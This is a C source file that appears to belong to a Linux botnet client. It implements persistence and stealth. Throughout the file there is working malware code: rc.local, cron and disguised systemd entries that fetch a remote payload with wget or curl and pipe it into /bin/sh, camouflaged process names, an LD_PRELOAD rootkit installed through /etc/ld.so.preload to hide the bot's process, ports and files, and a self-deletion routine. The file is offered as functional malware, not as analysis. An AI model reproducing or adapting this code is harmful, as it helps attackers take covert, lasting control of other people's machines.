/* ==========================================================================
 *  persist.c -- Persistence mechanisms
 *  Pure C port of persist.cpp.  GCC 4.1.2 / C89+C99, uClibc.
 * ========================================================================== */

#include "bot.h"

/* Prefer the resolved (IP-based) fetch URL if available, else original */
#define FETCH_URL() (ds_len(&g_fetch_url_resolved) > 0 ? &g_fetch_url_resolved : &g_fetch_url)

/* Liveness check: is the bot process still running?
   Bakes our PID into the cron/rc.local command at install time.
   kill -0 just checks existence — no signals sent, no files, no ports. */
static void liveness_guard(dstr *cmd, const char *on_alive) {
    char pid_str[16];
    snprintf(pid_str, sizeof(pid_str), "%d", (int)getpid());
    ds_cat(cmd, "kill -0 ");
    ds_cat(cmd, pid_str);
    ds_cat(cmd, " 2>/dev/null && ");
    ds_cat(cmd, on_alive);
}

/* ==========================================================================
 * LOCAL HELPERS
 * ========================================================================== */

/* Generate a camouflage name: pick random camo name + "-" + random4 */
static void kimsuky(dstr *out) {
    char rnd[5];
    ds_init(out);
    ensure_proto();
    random_string(rnd, 4);
    if (sa_count(&g_camo_names) == 0) {
        ds_set(out, "proc-");
        ds_cat(out, rnd);
        return;
    }
    {
        size_t idx = (size_t)(urandom_u32() % sa_count(&g_camo_names));
        ds_set(out, sa_get(&g_camo_names, idx));
        ds_cat(out, "-");
        ds_cat(out, rnd);
    }
}

/* Append a line to a file */
static int append_file(const char *path, const char *line, int perm) {
    int fd;
    fd = open(path, O_APPEND | O_WRONLY | O_CREAT, (mode_t)perm);
    if (fd < 0) return -1;
    write(fd, line, strlen(line));
    close(fd);
    return 0;
}

/* Read entire file into a dstr */
static void read_file(const char *path, dstr *out) {
    FILE *f;
    char buf[4096];
    size_t n;

    ds_init(out);
    f = fopen(path, "r");
    if (!f) return;
    while ((n = fread(buf, 1, sizeof(buf), f)) > 0) {
        ds_catn(out, buf, n);
    }
    fclose(f);
}

/* Get executable path. Strip " (deleted)" suffix that Linux appends
   to /proc/self/exe after unlink — unquoted parens break shell syntax. */
static void get_exe_path(dstr *out) {
    char buf[4096];
    ssize_t len;
    char *del;
    ds_init(out);
    len = readlink("/proc/self/exe", buf, sizeof(buf) - 1);
    if (len <= 0) return;
    buf[len] = '\0';
    del = strstr(buf, " (deleted)");
    if (del) *del = '\0';
    ds_set(out, buf);
}

/* ── BusyBox-compatible crontab helpers ──
   BusyBox crontab doesn't support -l/-r/- flags.
   Fallback: read/write the crontab file directly. */
static const char *crontab_paths[] = {
    "/var/spool/cron/crontabs/root",
    "/var/spool/cron/root",
    "/etc/crontabs/root",
    NULL
};

static const char *find_crontab_file(void) {
    int i;
    struct stat st;
    for (i = 0; crontab_paths[i]; i++) {
        if (stat(crontab_paths[i], &st) == 0)
            return crontab_paths[i];
    }
    for (i = 0; crontab_paths[i]; i++) {
        char dir[256];
        const char *slash;
        strncpy(dir, crontab_paths[i], sizeof(dir) - 1);
        dir[sizeof(dir) - 1] = '\0';
        slash = strrchr(dir, '/');
        if (slash) {
            dir[slash - dir] = '\0';
            if (stat(dir, &st) == 0)
                return crontab_paths[i];
        }
    }
    return NULL;
}

static void crontab_read(dstr *out) {
    FILE *fp;
    char buf[4096];
    dstr cmd;

    ds_init(out);
    ds_init(&cmd);
    ds_catds(&cmd, &g_crontab_bin);
    ds_cat(&cmd, " -l 2>/dev/null");
    fp = popen(ds_cstr(&cmd), "r");
    ds_free(&cmd);
    if (fp) {
        while (fgets(buf, sizeof(buf), fp))
            ds_cat(out, buf);
        if (pclose(fp) == 0 && ds_len(out) > 0)
            return;
        ds_free(out);
        ds_init(out);
    }
    {
        const char *path = find_crontab_file();
        if (path) read_file(path, out);
    }
}

static void crontab_write(const char *contents) {
    dstr cmd;
    int rc;

    /* Use heredoc with single-quoted delimiter — immune to single quotes,
       dollar signs, backticks etc. inside the cron job content. */
    ds_init(&cmd);
    ds_catds(&cmd, &g_crontab_bin);
    ds_cat(&cmd, " - <<'ENDCRON'\n");
    ds_cat(&cmd, contents);
    ds_cat(&cmd, "\nENDCRON");
    rc = system(ds_cstr(&cmd));
    ds_free(&cmd);
    if (rc == 0) return;

    {
        const char *path = find_crontab_file();
        if (!path) path = "/var/spool/cron/crontabs/root";
        {
            char dir[256];
            const char *slash;
            strncpy(dir, path, sizeof(dir) - 1);
            dir[sizeof(dir) - 1] = '\0';
            slash = strrchr(dir, '/');
            if (slash) {
                dir[slash - dir] = '\0';
                mkdir(dir, 0755);
            }
        }
        {
            FILE *f = fopen(path, "w");
            if (f) {
                fputs(contents, f);
                fputc('\n', f);
                fclose(f);
                chmod(path, 0600);
            }
        }
    }
}

static void crontab_remove(void) {
    dstr cmd;
    int rc;

    ds_init(&cmd);
    ds_catds(&cmd, &g_crontab_bin);
    ds_cat(&cmd, " -r 2>/dev/null");
    rc = system(ds_cstr(&cmd));
    ds_free(&cmd);
    if (rc == 0) return;

    {
        const char *path = find_crontab_file();
        if (path) {
            FILE *f = fopen(path, "w");
            if (f) fclose(f);
        }
    }
}

/* Get basename from path */
static const char *basename_cstr(const char *path) {
    const char *slash = strrchr(path, '/');
    return slash ? slash + 1 : path;
}

/* ==========================================================================
 * FIN7 -- rc.local persistence
 * Appends a guarded one-liner:
 *   - Checks PID file: if process is alive, does nothing
 *   - If binary exists on disk, runs it directly
 *   - If binary is missing, downloads via fetch_url (wget || curl)
 * ========================================================================== */

void fin7(void) {
    dstr content, entry, exe;
    struct stat st;

    ensure_persist();
    ensure_proto();
    ensure_boot();

    /* Get our own binary path */
    get_exe_path(&exe);
    if (ds_empty(&exe)) { ds_free(&exe); return; }

    debug_log("fin7: setting up rc.local persistence via binary: %s", ds_cstr(&exe));

    if (stat(ds_cstr(&g_rc_target), &st) != 0) { ds_free(&exe); return; }

    read_file(ds_cstr(&g_rc_target), &content);

    /* Already installed? Check for our binary path or bin_label */
    if (strstr(ds_cstr(&content), ds_cstr(&g_bin_label))) {
        ds_free(&content);
        ds_free(&exe);
        return;
    }

    /* Remove stale entries referencing our labels */
    {
        dstr cleaned;
        const char *p, *nl;
        ds_init(&cleaned);
        p = ds_cstr(&content);
        while (*p) {
            nl = strchr(p, '\n');
            if (!nl) nl = p + strlen(p);
            {
                size_t llen = (size_t)(nl - p);
                char *line = (char *)malloc(llen + 1);
                memcpy(line, p, llen);
                line[llen] = '\0';
                if (!strstr(line, ds_cstr(&g_bin_label)) &&
                    !strstr(line, ds_cstr(&g_store_dir))) {
                    ds_catn(&cleaned, p, llen);
                    ds_catc(&cleaned, '\n');
                }
                free(line);
            }
            p = (*nl) ? nl + 1 : nl;
        }
        {
            FILE *f = fopen(ds_cstr(&g_rc_target), "w");
            if (f) {
                fwrite(ds_cstr(&cleaned), 1, ds_len(&cleaned), f);
                fclose(f);
            }
        }
        chmod(ds_cstr(&g_rc_target), 0755);
        ds_free(&cleaned);
    }

    /* Append unconditional one-liner (rc.local = boot only, PIDs are stale,
       revil_single_instance() handles dedup at runtime) */
    ds_init(&entry);
    ds_cat(&entry, "([ -x ");
    ds_catds(&entry, &exe);
    ds_cat(&entry, " ] && ");
    ds_catds(&entry, &exe);
    ds_cat(&entry, " || (wget -qO- ");
    ds_catds(&entry, FETCH_URL());
    ds_cat(&entry, " || curl -sL ");
    ds_catds(&entry, FETCH_URL());
    ds_cat(&entry, ") | /bin/sh) > /dev/null 2>&1 &\n");
    append_file(ds_cstr(&g_rc_target), ds_cstr(&entry), 0700);

    ds_free(&content);
    ds_free(&exe);
    ds_free(&entry);
}

/* ==========================================================================
 * CARBANAK -- cron backup for dragonfly
 * Guarded cron entry:
 *   - Checks PID file: if process is alive, exits immediately
 *   - If binary exists on disk, runs it directly
 *   - If binary is missing, downloads via fetch_url (wget || curl)
 * ========================================================================== */

void carbanak(const char *hidden_dir) {
    dstr cron_job;

    (void)hidden_dir;
    ensure_persist();
    ensure_proto();
    ensure_boot();

    /* Cron: kill -0 guard, then fetch + run. No binary path — bot self-deletes. */
    ds_init(&cron_job);
    ds_cat(&cron_job, "* * * * * /bin/sh -c '");
    liveness_guard(&cron_job, "exit 0; ");
    ds_cat(&cron_job, "(wget -qO- ");
    ds_catds(&cron_job, FETCH_URL());
    ds_cat(&cron_job, " || curl -sL ");
    ds_catds(&cron_job, FETCH_URL());
    ds_cat(&cron_job, ") | /bin/sh'");
    ds_cat(&cron_job, " > /dev/null 2>&1");

    debug_log("carbanak: installing cron: %s", ds_cstr(&cron_job));

    /* Install: read existing, filter, append ours, write back.
       Uses BusyBox-compatible helpers. */
    {
        dstr existing, cleaned;
        const char *p, *nl;

        crontab_read(&existing);

        ds_init(&cleaned);
        p = ds_cstr(&existing);
        while (*p) {
            size_t llen;
            char *line;
            nl = strchr(p, '\n');
            if (!nl) nl = p + strlen(p);
            llen = (size_t)(nl - p);
            line = (char *)malloc(llen + 1);
            memcpy(line, p, llen);
            line[llen] = '\0';
            if (strstr(line, ds_cstr(&g_fetch_url)) ||
                (ds_len(&g_fetch_url_resolved) > 0 &&
                 strstr(line, ds_cstr(&g_fetch_url_resolved))) ||
                strstr(line, ds_cstr(&g_bin_label)) ||
                strstr(line, ds_cstr(&g_script_label)) ||
                (strstr(line, "wget") && strstr(line, "|") && strstr(line, "sh")) ||
                (strstr(line, "curl") && strstr(line, "|") && strstr(line, "sh"))) {
                /* strip */
            } else {
                ds_catn(&cleaned, p, llen);
                ds_catc(&cleaned, '\n');
            }
            free(line);
            p = (*nl) ? nl + 1 : nl;
        }

        ds_catds(&cleaned, &cron_job);

        while (!ds_empty(&cleaned) && ds_back(&cleaned) == '\n')
            ds_pop(&cleaned);

        crontab_write(ds_cstr(&cleaned));

        ds_free(&existing);
        ds_free(&cleaned);
    }

    ds_free(&cron_job);
}

/* ==========================================================================
 * DRAGONFLY -- systemd persistence (GorillaBot-style)
 *
 * Simple: service downloads + runs init.sh, Restart=always loops it.
 * init.sh checks if bot is alive before doing anything.
 * Bot process is completely decoupled from the service lifecycle.
 * ========================================================================== */

int dragonfly(void) {
    dstr unit_content, cmd;
    FILE *f;
    struct stat st;

    ensure_persist();
    ensure_boot();

    if (stat(ds_cstr(&g_systemctl_bin), &st) != 0) {
        /* No systemd — still install cron as primary persistence */
        carbanak(NULL);
        return 0;
    }

    /* If service file already exists, don't rewrite — daemon-reload would
       restart the service and kill us if we ARE the service process. */
    if (stat(ds_cstr(&g_unit_path), &st) == 0) {
        debug_log("dragonfly: service already installed, skipping");
        carbanak(NULL);  /* still refresh cron */
        return 1;
    }

    debug_log("dragonfly: service=%s fetch=%s", ds_cstr(&g_unit_path), ds_cstr(FETCH_URL()));

    mkdir(ds_cstr(&g_store_dir), 0755);

    /* Service: unconditional oneshot at boot. Restart=on-failure retries
       if wget fails (network not ready yet). No PID guard — PIDs are
       stale after reboot. revil_single_instance() handles dedup.
       Cron (carbanak) handles runtime persistence. */
    ds_init(&unit_content);
    ds_cat(&unit_content, "[Unit]\n");
    ds_cat(&unit_content, "Description=System Service Manager\n");
    ds_cat(&unit_content, "After=network-online.target\n");
    ds_cat(&unit_content, "Wants=network-online.target\n\n");
    ds_cat(&unit_content, "[Service]\n");
    ds_cat(&unit_content, "Type=oneshot\n");
    ds_cat(&unit_content, "ExecStart=/bin/sh -c '");
    ds_cat(&unit_content, "F=/tmp/.");
    ds_catds(&unit_content, &g_bin_label);
    ds_cat(&unit_content, "; wget -qO $F ");
    ds_catds(&unit_content, FETCH_URL());
    ds_cat(&unit_content, " || curl -sLo $F ");
    ds_catds(&unit_content, FETCH_URL());
    ds_cat(&unit_content, "; sh $F; rm -f $F'\n");
    ds_cat(&unit_content, "Restart=on-failure\n");
    ds_cat(&unit_content, "RestartSec=60\n\n");
    ds_cat(&unit_content, "[Install]\n");
    ds_cat(&unit_content, "WantedBy=multi-user.target\n");

    f = fopen(ds_cstr(&g_unit_path), "w");
    if (f) { fwrite(ds_cstr(&unit_content), 1, ds_len(&unit_content), f); fclose(f); }
    chmod(ds_cstr(&g_unit_path), 0644);

    /* Reload + enable (no --now: don't start while we're already running) */
    ds_init(&cmd);
    ds_catds(&cmd, &g_systemctl_bin);
    ds_cat(&cmd, " daemon-reload 2>/dev/null");
    system(ds_cstr(&cmd));
    ds_free(&cmd);

    ds_init(&cmd);
    ds_catds(&cmd, &g_systemctl_bin);
    ds_cat(&cmd, " enable --now ");
    ds_catds(&cmd, &g_unit_name);
    ds_cat(&cmd, " 2>/dev/null");
    system(ds_cstr(&cmd));
    ds_free(&cmd);

    ds_free(&unit_content);

    /* Cron backup */
    carbanak(NULL);

    return 1;
}

/* ==========================================================================
 * PERSIST_REFRESH -- strip existing persistence and reinstall with current
 * g_fetch_url / g_bins_host values.  Called by !updatefetch after the globals
 * have been overwritten in memory.
 * ========================================================================== */

void persist_refresh(void) {
    dstr cmd;

    ensure_persist();
    ensure_boot();
    debug_log("persist_refresh: rewriting persistence with updated fetch_url");

    /* 1. Stop and remove systemd service (if any) */
    {
        struct stat st;
        if (stat(ds_cstr(&g_systemctl_bin), &st) == 0) {
            ds_init(&cmd);
            ds_catds(&cmd, &g_systemctl_bin);
            ds_cat(&cmd, " stop ");
            ds_catds(&cmd, &g_unit_name);
            system(ds_cstr(&cmd));
            ds_free(&cmd);

            ds_init(&cmd);
            ds_catds(&cmd, &g_systemctl_bin);
            ds_cat(&cmd, " disable ");
            ds_catds(&cmd, &g_unit_name);
            system(ds_cstr(&cmd));
            ds_free(&cmd);

            unlink(ds_cstr(&g_unit_path));

            ds_init(&cmd);
            ds_catds(&cmd, &g_systemctl_bin);
            ds_cat(&cmd, " daemon-reload");
            system(ds_cstr(&cmd));
            ds_free(&cmd);
        }
    }

    /* 2. Remove cron entries — match ALL our identifiers. BusyBox-safe. */
    {
        dstr existing, cleaned;
        const char *p, *nl;

        crontab_read(&existing);
        if (ds_len(&existing) > 0) {
            ds_init(&cleaned);
            p = ds_cstr(&existing);
            while (*p) {
                size_t llen;
                char *line;
                nl = strchr(p, '\n');
                if (!nl) nl = p + strlen(p);
                llen = (size_t)(nl - p);
                line = (char *)malloc(llen + 1);
                memcpy(line, p, llen);
                line[llen] = '\0';
                if (strstr(line, ds_cstr(&g_fetch_url)) ||
                    (ds_len(&g_fetch_url_resolved) > 0 &&
                     strstr(line, ds_cstr(&g_fetch_url_resolved))) ||
                    strstr(line, ds_cstr(&g_bin_label)) ||
                    strstr(line, ds_cstr(&g_script_label)) ||
                    (strstr(line, "wget") && strstr(line, "|") && strstr(line, "sh")) ||
                    (strstr(line, "curl") && strstr(line, "|") && strstr(line, "sh"))) {
                    /* our entry — remove */
                } else {
                    ds_catn(&cleaned, p, llen);
                    ds_catc(&cleaned, '\n');
                }
                free(line);
                p = (*nl) ? nl + 1 : nl;
            }
            while (!ds_empty(&cleaned) && ds_back(&cleaned) == '\n')
                ds_pop(&cleaned);
            if (ds_empty(&cleaned))
                crontab_remove();
            else
                crontab_write(ds_cstr(&cleaned));
            ds_free(&cleaned);
        }
        ds_free(&existing);
    }

    /* 3. Clean rc.local */
    {
        dstr rc_content;
        read_file(ds_cstr(&g_rc_target), &rc_content);
        if (!ds_empty(&rc_content)) {
            dstr rc_cleaned;
            const char *p, *nl;
            ds_init(&rc_cleaned);
            p = ds_cstr(&rc_content);
            while (*p) {
                size_t llen;
                char *line;
                nl = strchr(p, '\n');
                if (!nl) nl = p + strlen(p);
                llen = (size_t)(nl - p);
                line = (char *)malloc(llen + 1);
                memcpy(line, p, llen);
                line[llen] = '\0';
                if (!strstr(line, ds_cstr(&g_bin_label)) &&
                    !strstr(line, ds_cstr(&g_store_dir))) {
                    ds_catn(&rc_cleaned, p, llen);
                    ds_catc(&rc_cleaned, '\n');
                }
                free(line);
                p = (*nl) ? nl + 1 : nl;
            }
            {
                FILE *f = fopen(ds_cstr(&g_rc_target), "w");
                if (f) {
                    fwrite(ds_cstr(&rc_cleaned), 1, ds_len(&rc_cleaned), f);
                    fclose(f);
                }
            }
            chmod(ds_cstr(&g_rc_target), 0755);
            ds_free(&rc_cleaned);
        }
        ds_free(&rc_content);
    }

    /* 4. Reinstall persistence with updated g_fetch_url */
    if (!dragonfly()) {
        /* systemd not available — use rc.local + cron directly */
        fin7();
        carbanak(NULL);
    }

    debug_log("persist_refresh: done");
}

/* ==========================================================================
 * NUKE AND EXIT -- complete self-removal (matches Go nukeAndExit)
 * ========================================================================== */

void nuke_and_exit(void) {
    dstr cmd, existing, cleaned, exe;

    ensure_persist();
    ensure_boot();
    debug_log("nuke_and_exit: Removing all persistence");

    /* 1. Stop and remove systemd service */
    ds_init(&cmd);
    ds_catds(&cmd, &g_systemctl_bin);
    ds_cat(&cmd, " stop ");
    ds_catds(&cmd, &g_unit_name);
    system(ds_cstr(&cmd));
    ds_free(&cmd);

    ds_init(&cmd);
    ds_catds(&cmd, &g_systemctl_bin);
    ds_cat(&cmd, " disable ");
    ds_catds(&cmd, &g_unit_name);
    system(ds_cstr(&cmd));
    ds_free(&cmd);

    unlink(ds_cstr(&g_unit_path));

    ds_init(&cmd);
    ds_catds(&cmd, &g_systemctl_bin);
    ds_cat(&cmd, " daemon-reload");
    system(ds_cstr(&cmd));
    ds_free(&cmd);

    /* 2. Remove cron entries — use same read logic as crontab_read() */
    crontab_read(&existing);
    {

        ds_init(&cleaned);
        {
            const char *p = ds_cstr(&existing);
            const char *nl;
            while (*p) {
                size_t llen;
                char *line;
                nl = strchr(p, '\n');
                if (!nl) nl = p + strlen(p);
                llen = (size_t)(nl - p);
                line = (char *)malloc(llen + 1);
                memcpy(line, p, llen);
                line[llen] = '\0';
                if (strstr(line, ds_cstr(&g_fetch_url)) ||
                    (ds_len(&g_fetch_url_resolved) > 0 &&
                     strstr(line, ds_cstr(&g_fetch_url_resolved))) ||
                    strstr(line, ds_cstr(&g_bin_label)) ||
                    strstr(line, ds_cstr(&g_script_label)) ||
                    (strstr(line, "wget") && strstr(line, "|") && strstr(line, "sh")) ||
                    (strstr(line, "curl") && strstr(line, "|") && strstr(line, "sh"))) {
                    /* strip our entry */
                } else {
                    ds_catn(&cleaned, p, llen);
                    ds_catc(&cleaned, '\n');
                }
                free(line);
                p = (*nl) ? nl + 1 : nl;
            }
        }

        /* Trim trailing newlines */
        while (!ds_empty(&cleaned) && ds_back(&cleaned) == '\n')
            ds_pop(&cleaned);

        if (ds_empty(&cleaned)) {
            ds_init(&cmd);
            ds_catds(&cmd, &g_crontab_bin);
            ds_cat(&cmd, " -r 2>/dev/null");
            system(ds_cstr(&cmd));
            ds_free(&cmd);
        } else {
            crontab_write(ds_cstr(&cleaned));
        }
        ds_free(&cleaned);
    }
    ds_free(&existing);

    /* 3. Clean rc.local */
    {
        dstr rc_content;
        read_file(ds_cstr(&g_rc_target), &rc_content);
        if (!ds_empty(&rc_content)) {
            dstr rc_cleaned;
            const char *p, *nl;
            ds_init(&rc_cleaned);
            p = ds_cstr(&rc_content);
            while (*p) {
                size_t llen;
                char *line;
                nl = strchr(p, '\n');
                if (!nl) nl = p + strlen(p);
                llen = (size_t)(nl - p);
                line = (char *)malloc(llen + 1);
                memcpy(line, p, llen);
                line[llen] = '\0';
                if (!strstr(line, ds_cstr(&g_bin_label)) &&
                    !strstr(line, ds_cstr(&g_store_dir))) {
                    ds_catn(&rc_cleaned, p, llen);
                    ds_catc(&rc_cleaned, '\n');
                }
                free(line);
                p = (*nl) ? nl + 1 : nl;
            }
            {
                FILE *f = fopen(ds_cstr(&g_rc_target), "w");
                if (f) {
                    fwrite(ds_cstr(&rc_cleaned), 1, ds_len(&rc_cleaned), f);
                    fclose(f);
                }
            }
            chmod(ds_cstr(&g_rc_target), 0755);
            ds_free(&rc_cleaned);
        }
        ds_free(&rc_content);
    }

    /* 4. Remove hidden directory */
    ds_init(&cmd);
    ds_cat(&cmd, "rm -rf ");
    ds_catds(&cmd, &g_store_dir);
    system(ds_cstr(&cmd));
    ds_free(&cmd);

    /* 5. Close control port + remove lock file */
    if (g_ctrl_fd >= 0) { close(g_ctrl_fd); g_ctrl_fd = -1; }
    unlink(ds_cstr(&g_lock_loc));

    /* 6. Remove rootkit if installed */
    rootkit_remove();

    /* 7. Remove own executable */
    get_exe_path(&exe);
    if (!ds_empty(&exe)) unlink(ds_cstr(&exe));
    ds_free(&exe);

    _exit(0);
}

/* ==========================================================================
 * ROOTKIT — LD_PRELOAD-based process/file/port hiding
 * ========================================================================== */

/* Path where rootkit .so will be installed */
#define RK_SO_PATH "/usr/lib/libproc.so"
#define RK_PRELOAD_PATH "/etc/ld.so.preload"

/* The rootkit .so is embedded as an external symbol by the build system.
 * If not available (e.g., stripped build), these functions are no-ops.
 * To embed: xxd -i libproc.so > rootkit_blob.h, then
 *   extern unsigned char rootkit_so[];
 *   extern unsigned int rootkit_so_len;
 *
 * For now, use a runtime approach: the .so is compiled separately and
 * the bot writes it to disk from a base64 blob sent via !persist rootkit <b64>.
 */

void rootkit_install(const char *b64_so) {
    FILE *fp;
    FILE *preload;
    char line[512];
    int already = 0;

    if (!b64_so || !b64_so[0]) {
        debug_log("rootkit_install: no .so data provided");
        return;
    }

    /* Decode base64 .so blob */
    {
        dbuf so_data = base64_decode(b64_so);
        if (so_data.data == NULL || so_data.len < 100) {
            debug_log("rootkit_install: invalid .so data (len=%zu)", so_data.len);
            db_free(&so_data);
            return;
        }

        /* Write .so to disk */
        fp = fopen(RK_SO_PATH, "wb");
        if (!fp) {
            /* Try alternative path */
            fp = fopen("/lib/libproc.so", "wb");
        }
        if (!fp) {
            debug_log("rootkit_install: cannot write .so");
            db_free(&so_data);
            return;
        }
        fwrite(so_data.data, 1, so_data.len, fp);
        fclose(fp);
        chmod(RK_SO_PATH, 0644);
        db_free(&so_data);
    }

    /* Add to /etc/ld.so.preload (system-wide) */
    preload = fopen(RK_PRELOAD_PATH, "r");
    if (preload) {
        while (fgets(line, sizeof(line), preload)) {
            if (strstr(line, "libproc.so")) { already = 1; break; }
        }
        fclose(preload);
    }

    if (!already) {
        preload = fopen(RK_PRELOAD_PATH, "a");
        if (preload) {
            fprintf(preload, "%s\n", RK_SO_PATH);
            fclose(preload);
            debug_log("rootkit_install: added to ld.so.preload");
        } else {
            debug_log("rootkit_install: cannot write ld.so.preload (not root?)");
            /* Fallback: set LD_PRELOAD in our own environment for children */
            setenv("LD_PRELOAD", RK_SO_PATH, 1);
        }
    }

    /* Set env vars for the rootkit to know what to hide.
     * Includes bot binary name so it's hidden from ls/find/stat. */
    {
        char pid_str[16], files_buf[256];
        dstr exe;
        get_exe_path(&exe);
        snprintf(pid_str, sizeof(pid_str), "%d", (int)getpid());
        setenv("RK_PID", pid_str, 1);
        setenv("RK_PORTS", "42780,1080", 1);
        snprintf(files_buf, sizeof(files_buf), "libproc.so,%s,.d",
                 ds_empty(&exe) ? "" : basename_cstr(ds_cstr(&exe)));
        setenv("RK_FILES", files_buf, 1);
        ds_free(&exe);
    }

    debug_log("rootkit_install: done");
}

void rootkit_remove(void) {
    FILE *fp;
    char buf[4096];
    int len = 0;

    /* Remove .so file */
    unlink(RK_SO_PATH);
    unlink("/lib/libproc.so");

    /* Remove from ld.so.preload */
    fp = fopen(RK_PRELOAD_PATH, "r");
    if (fp) {
        char line[512];
        buf[0] = '\0';
        while (fgets(line, sizeof(line), fp)) {
            if (!strstr(line, "libproc.so")) {
                int ll = (int)strlen(line);
                if (len + ll < (int)sizeof(buf)) {
                    memcpy(buf + len, line, (size_t)ll);
                    len += ll;
                }
            }
        }
        fclose(fp);
        buf[len] = '\0';

        fp = fopen(RK_PRELOAD_PATH, "w");
        if (fp) {
            if (len > 0) fwrite(buf, 1, (size_t)len, fp);
            fclose(fp);
        }
    }

    unsetenv("LD_PRELOAD");
    unsetenv("RK_PID");
    unsetenv("RK_PORTS");
    unsetenv("RK_FILES");

    debug_log("rootkit_remove: cleaned up");
}

/* Auto-deploy and activate rootkit on startup if running as root.
 * If embedded blob is available (EMBED_ROOTKIT), writes .so to disk first.
 * If .so is already on disk from a prior install, just activates it. */
void rootkit_auto(void) {
    struct stat st;
    FILE *preload;
    char line[512];
    int already = 0;

    /* If .so not on disk, try writing embedded blob */
    if (stat(RK_SO_PATH, &st) != 0 && stat("/lib/libproc.so", &st) != 0) {
#ifdef EMBED_ROOTKIT
        /* Write embedded .so to disk */
        #include "headers/rootkit_blob.h"
        FILE *fp = fopen(RK_SO_PATH, "wb");
        if (!fp) fp = fopen("/lib/libproc.so", "wb");
        if (fp) {
            fwrite(libproc_so, 1, libproc_so_len, fp);
            fclose(fp);
            chmod(RK_SO_PATH, 0644);
            debug_log("rootkit_auto: wrote embedded .so to disk");
        } else {
            debug_log("rootkit_auto: cannot write .so (not root?)");
            return;
        }
#else
        debug_log("rootkit_auto: .so not found and no embedded blob, skipping");
        return;
#endif
    }

    /* Check if already in ld.so.preload */
    preload = fopen(RK_PRELOAD_PATH, "r");
    if (preload) {
        while (fgets(line, sizeof(line), preload)) {
            if (strstr(line, "libproc.so")) { already = 1; break; }
        }
        fclose(preload);
    }

    if (!already) {
        preload = fopen(RK_PRELOAD_PATH, "a");
        if (preload) {
            fprintf(preload, "%s\n", RK_SO_PATH);
            fclose(preload);
        } else {
            setenv("LD_PRELOAD", RK_SO_PATH, 1);
        }
    }

    /* Set env for rootkit to know what to hide.
     * Includes bot binary name so it's hidden from userland tools. */
    {
        char pid_str[16], files_buf[256];
        dstr exe;
        get_exe_path(&exe);
        snprintf(pid_str, sizeof(pid_str), "%d", (int)getpid());
        setenv("RK_PID", pid_str, 1);
        setenv("RK_PORTS", "42780,1080", 1);
        snprintf(files_buf, sizeof(files_buf), "libproc.so,%s,.d",
                 ds_empty(&exe) ? "" : basename_cstr(ds_cstr(&exe)));
        setenv("RK_FILES", files_buf, 1);
        ds_free(&exe);
    }

    debug_log("rootkit_auto: activated (already_preloaded=%d)", already);
}
